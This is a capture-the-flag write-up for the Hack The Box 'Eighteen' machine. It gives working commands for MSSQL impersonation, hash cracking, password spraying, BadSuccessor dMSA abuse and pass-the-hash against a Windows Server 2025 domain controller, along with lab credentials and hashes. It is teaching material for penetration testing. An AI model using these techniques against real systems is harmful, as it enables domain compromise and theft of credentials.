# HTB: Eighteen — Writeup

**OS:** Windows (AD / DC)
**Difficulty:** Easy
**Techniques:** MSSQL login impersonation, Werkzeug/PBKDF2 cracking, MSSQL RID brute, password spraying, BadSuccessor (dMSA) privilege escalation, pass-the-hash

---

## Synopsis

Eighteen is an Easy Windows machine built around a Server 2025 domain controller that exposes only three services — HTTP, MSSQL and WinRM — with the usual Active Directory ports (SMB/LDAP/Kerberos) firewalled off. An assumed-breach SQL login (`kevin`) can impersonate the `appdev` login, which unlocks the `financial_planner` application database and a Werkzeug (Flask) PBKDF2 admin hash. Cracking that hash yields a password that is reused by the domain user `adam.scott`. Because LDAP/SMB are unreachable, domain users are enumerated via MSSQL RID brute-forcing, and spraying the cracked password lands a WinRM shell as `adam.scott`. `adam.scott` belongs to the `IT` group, which holds `CreateChild` over the `Staff` OU — the precondition for the **BadSuccessor** attack, a Server 2025 delegated Managed Service Account (dMSA) privilege escalation. Creating a dMSA linked as Administrator's successor and requesting its Kerberos key package recovers Administrator's NT hash, which is used to pass-the-hash over WinRM for a full compromise.

## Skills Required

- Basic Active Directory concepts (domains, OUs, ACLs, service accounts)
- MSSQL authentication and login impersonation (`EXECUTE AS`)
- Hash identification and cracking (Werkzeug / PBKDF2-HMAC-SHA256)
- Password spraying and pass-the-hash
- Comfort with Impacket, NetExec, evil-winrm and proxying tools through a SOCKS tunnel

## Skills Learned

- Enumerating domain accounts through **MSSQL RID brute-forcing** when SMB/LDAP are not exposed
- Converting a Werkzeug `pbkdf2:sha256` hash into hashcat mode `10900` format
- The **BadSuccessor** technique: abusing `CreateChild` on an OU to create a delegated Managed Service Account (dMSA) whose Kerberos key package leaks a privileged account's keys
- Why `CreateChild` is not `WriteProperty` — successor attributes must be set at object-creation time
- Reading a dMSA key package correctly: "Current keys" are the dMSA's own; "Previous keys" belong to the superseded account
- Dealing with Kerberos `KRB_AP_ERR_SKEW` caused by hypervisor guest time-sync

---

## Enumeration

### Nmap

A ping scan reports the host down — Windows Firewall drops ICMP — so `-Pn` is required:

```
└──╼ [★]$ nmap -p80,1433,5985 -sCV 10.129.102.15 -Pn -oA nmap/Eighteen
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
```

Only three ports: **80 (IIS/HTTP)**, **1433 (MSSQL 2022)** and **5985 (WinRM)**. What is *absent* is as telling as what is open — there is no 445/SMB, 389/LDAP or 88/Kerberos, so standard AD enumeration cannot reach the DC directly. The port 80 redirect gives the hostname `eighteen.htb`, added to `/etc/hosts`. The `clock-skew: 7h00m01s` line is an early warning that Kerberos work later will need a time fix.

This box is an **assumed-breach** scenario, providing the SQL credential `kevin:iNa2we6haRj2gaw!`.

### Credential validation (NetExec)

The provided creds fail on WinRM but succeed on MSSQL as a **local SQL login** (not a domain account):

```
└──╼ [★]$ nxc winrm 10.129.102.15 -u kevin -p 'iNa2we6haRj2gaw!'
WINRM  10.129.102.15  5985  DC01  [-] eighteen.htb\kevin:iNa2we6haRj2gaw!

└──╼ [★]$ nxc mssql 10.129.102.15 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth
MSSQL  10.129.102.15  1433  DC01  [*] Windows Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL  10.129.102.15  1433  DC01  [+] DC01\kevin:iNa2we6haRj2gaw!
```

`--local-auth` working (and plain auth failing with "login is from an untrusted domain") confirms `kevin` is a SQL Server login with no Windows identity — which is exactly why WinRM rejects him. The banner also reveals the host is **DC01**, a **Windows Server 2025** domain controller.

> Note the `nxc` argument-order gotcha: `-u`/`-p` accept multiple values, so the target must come **first** (`nxc mssql <target> -u ... -p ...`) or argparse swallows the target as a second password.

---

## Foothold

### MSSQL login impersonation → application database

Connecting interactively lands in `master` as a low-privilege `guest`. There is no `xp_cmdshell` and the interesting `financial_planner` database is denied:

```
└──╼ [★]$ mssqlclient.py eighteen.htb/kevin:'iNa2we6haRj2gaw!'@eighteen.htb
SQL (kevin  guest@master)> xp_cmdshell whoami
ERROR(DC01): The EXECUTE permission was denied on the object 'xp_cmdshell'
SQL (kevin  guest@master)> use financial_planner;
ERROR(DC01): The server principal "kevin" is not able to access the database "financial_planner"
```

When a low-privilege SQL login is stuck, the next move is to look for an **impersonation** grant. `kevin` can impersonate the `appdev` login, and once impersonated, `appdev` can open `financial_planner`:

```
SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev';
SQL (appdev  appdev@master)> use financial_planner;
SQL (appdev  appdev@financial_planner)> select name from sysobjects where xtype='U';
users
SQL (appdev  appdev@financial_planner)> select * from users;
  id   full_name   username   email                password_hash                                                                                   is_admin
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133   1
```

### Cracking the Werkzeug / PBKDF2 hash

The `pbkdf2:sha256:600000$salt$hash` layout is the **Werkzeug** format used by Flask's `generate_password_hash` — i.e. this is the web application's admin login, not a Windows account. The raw string is not directly accepted by John/hashcat, so it is reshaped into hashcat's **mode 10900** (`sha256:iterations:base64(salt):base64(digest)`):

```bash
python3 -c '
import base64
salt=b"AMtzteQIG7yAbZIa"
hexd="0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
print("sha256:600000:"+base64.b64encode(salt).decode()+":"+base64.b64encode(bytes.fromhex(hexd)).decode())
' > admin_10900.txt

hashcat -m 10900 admin_10900.txt /usr/share/wordlists/rockyou.txt
```

The password cracks to **`iloveyou1`**.

### The web application

Port 80 is a Flask **expenses tracker** backed by `financial_planner`, with register/login pages. A freshly registered account sees a Dashboard, but the **Admin** menu is gated:

![Flask expenses tracker: logged-in dashboard with a gated Admin menu item](images/eighteen_webapp-dashboard-admin-menu.png)

![Admin menu returns access-denied for a normal registered user before privilege is gained](images/eighteen_webapp-admin-denied-normal-user.png)

Logging in as `admin:iloveyou1` unlocks the admin dashboard:

![Admin dashboard of the Flask expenses tracker, accessible after authenticating as the admin user](images/eighteen_webapp-admin-dashboard.png)

However, it holds no obvious exploit primitive (no file upload, no template-rendered input). The real value of the cracked password turns out to be **reuse** elsewhere.

### Enumerating domain users via MSSQL RID brute

With SMB/LDAP unreachable, user enumeration normally fails — but NetExec's MSSQL module can **RID brute-force** through the SQL connection:

```
└──╼ [★]$ nxc mssql 10.129.102.15 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
MSSQL  ...  500: EIGHTEEN\Administrator
MSSQL  ...  1601: EIGHTEEN\mssqlsvc
MSSQL  ...  1606: EIGHTEEN\jamie.dunn
MSSQL  ...  1607: EIGHTEEN\jane.smith
MSSQL  ...  1608: EIGHTEEN\alice.jones
MSSQL  ...  1609: EIGHTEEN\adam.scott
MSSQL  ...  1610: EIGHTEEN\bob.brown
MSSQL  ...  1611: EIGHTEEN\carol.white
MSSQL  ...  1612: EIGHTEEN\dave.green
```

A one-liner turns that output straight into a user list — strip the `EIGHTEEN\` prefix, and because the per-account token is captured with `\S+$`, the multi-word built-in groups fall away:

```bash
nxc mssql 10.129.102.15 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute \
  | grep -oP 'EIGHTEEN\\\K\S+$' | grep -vE '\$$' | sort -u > users.txt
```

(A couple of single-word groups like `HR`/`IT`/`Finance` survive and can be trimmed; they are harmless in a spray.)

### Password spray → WinRM shell

Spraying the cracked web password across the domain users finds a reuse on `adam.scott`, with a `(Pwn3d!)` on WinRM:

```
└──╼ [★]$ nxc winrm 10.129.102.15 -u users.txt -p 'iloveyou1' --continue-on-success
WINRM  10.129.102.15  5985  DC01  [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)

└──╼ [★]$ evil-winrm -i 10.129.102.15 -u adam.scott -p 'iloveyou1'
*Evil-WinRM* PS C:\Users\adam.scott\Documents>
```

`user.txt` retrieved.

---

## Privilege Escalation

### BadSuccessor — dMSA privilege escalation (Server 2025)

`adam.scott` is a member of the `IT` group. Enumerating OU ACLs from the WinRM shell shows that `IT` holds **`CreateChild`** over the **`Staff`** OU:

```powershell
(Get-Acl "AD:\OU=Staff,DC=eighteen,DC=htb").Access |
  ? { $_.IdentityReference -like "*IT*" }
# -> CreateChild on OU=Staff,DC=eighteen,DC=htb
```

**Why this matters.** Windows Server 2025 introduced **delegated Managed Service Accounts (dMSAs)**. The *BadSuccessor* technique abuses two dMSA attributes: `msDS-ManagedAccountPrecededByLink` (the account this dMSA "succeeds") and `msDS-DelegatedMSAState = 2` (migration complete). When set, Kerberos treats the dMSA as the successor of the linked account and issues it a key package containing that account's keys. Being able to **create** a dMSA object in an OU (via `CreateChild`) is enough — the attacker controls the object's initial attributes, so they can point the successor link at `Administrator`.

Because LDAP/Kerberos are only reachable on the DC itself, a **chisel SOCKS tunnel** is used with `proxychains` for the LDAP and Kerberos steps.

#### Creating the dMSA

`bloodyAD`'s `add badSuccessor` helper creates the dMSA with the successor attributes set at creation time (it then crashes trying an unnecessary write to the Administrator object, which can be ignored):

```
proxychains4 -q bloodyAD -H 10.129.102.15 -d eighteen.htb -u adam.scott -p 'iloveyou1' \
  add badSuccessor darkangel
[+] Creating DMSA darkangel$ in OU=Staff,DC=eighteen,DC=htb
[+] Impersonating: CN=Administrator,CN=Users,DC=eighteen,DC=htb
```

Confirming the object shows both attributes are present:

```
proxychains4 -q bloodyAD ... get object 'CN=darkangel,OU=Staff,DC=eighteen,DC=htb'
msDS-DelegatedMSAState: 2
msDS-ManagedAccountPrecededByLink: CN=Administrator,CN=Users,DC=eighteen,DC=htb
```

> **False start — CreateChild ≠ WriteProperty.** Attempting to `set` those attributes *after* creation fails with `insufficientAccessRights`. `CreateChild` only lets you create the object and define its *initial* attributes; it grants no right to modify them afterwards. The successor link therefore has to be set in the same LDAP add request — which the creation helper already did.

#### Recovering Administrator's keys

Requesting a ticket with Impacket's dMSA-aware `getST.py` returns the dMSA key package:

```
proxychains4 -q getST.py -dc-ip 10.129.102.15 -dmsa \
  'eighteen.htb/adam.scott:iloveyou1' -impersonate 'darkangel$' -spn 'krbtgt/eighteen.htb'
[*] Requesting S4U2self
[*] Current keys:
[*]   rc4_hmac: 81e2df8028b1629c7c950a0547107c67
[*] Previous keys:
[*]   rc4_hmac: 0b133be956bfaddf9cea56701affddec
[-] Kerberos SessionError: KDC_ERR_BADOPTION  (S4U2Proxy — irrelevant, key package already dumped)
```

The crucial reading: **"Current keys" are the dMSA's own keys**, while **"Previous keys" belong to the superseded account — Administrator**. So Administrator's NT hash is `0b133be956bfaddf9cea56701affddec`. (The `KDC_ERR_BADOPTION` on the following S4U2Proxy step is a red herring — `adam.scott` simply isn't configured for delegation, and the key package has already been printed.)

> **Kerberos clock skew.** The ticket request repeatedly failed with `KRB_AP_ERR_SKEW`. The cause was the hypervisor's guest time-sync snapping the VM clock back to the host every few seconds; `timedatectl set-ntp off` alone did not stop it (it is the guest-additions service, not NTP). Freezing the sync daemon and setting the DC's **UTC** time made the clock hold long enough for the request to succeed. Note too that `ntpdate` cannot sync over the SOCKS tunnel because NTP is UDP.

#### Pass-the-hash as Administrator

WinRM (5985) is open directly, so no tunnel or Kerberos is needed for the final step — just pass-the-hash with Administrator's recovered NT hash:

```
└──╼ [★]$ evil-winrm -i 10.129.102.15 -u Administrator -H 0b133be956bfaddf9cea56701affddec
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
eighteen\administrator
```

`root.txt` retrieved.

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Enumeration | `-Pn` nmap; identify 80/1433/5985 with no SMB/LDAP/Kerberos; validate assumed-breach SQL creds with NetExec |
| Foothold | MSSQL login impersonation (`EXECUTE AS LOGIN = 'appdev'`) → read `financial_planner.users` |
| Foothold | Crack Werkzeug PBKDF2 hash (hashcat `-m 10900`) → `iloveyou1` |
| Foothold | MSSQL `--rid-brute` user enumeration (SMB/LDAP closed) → password spray → WinRM as `adam.scott` |
| PrivEsc | BadSuccessor: `CreateChild` on `Staff` OU → create dMSA linked to Administrator → `getST -dmsa` recovers Administrator's key package |
| PrivEsc | Pass-the-hash as Administrator over WinRM |

---

## Lessons / Takeaways

- **Missing ports are intel.** No SMB/LDAP/Kerberos externally forces the attack through MSSQL — including user enumeration via `--rid-brute`, which many people only associate with SMB.
- **MSSQL impersonation chains.** When a SQL login is stuck in `master` as `guest`, enumerate impersonation grants before giving up on the database.
- **Hash format ≠ hash algorithm.** The Werkzeug/PBKDF2 string needed reshaping into hashcat's 10900 input; recognising the Flask origin also pointed the cracked password at the web admin, whose real value was reuse by a domain user.
- **BadSuccessor is a create-time attack.** `CreateChild` lets you set a dMSA's successor attributes only during creation; you cannot edit them afterwards without `WriteProperty`. Read the key package carefully — "Previous keys" are the victim's, not "Current keys".
- **Clock skew in a VM.** `KRB_AP_ERR_SKEW` here was caused by guest-additions time-sync, not NTP; freeze the sync service (or use `faketime`) and set the DC's UTC time. `ntpdate` won't traverse a TCP-only SOCKS tunnel.
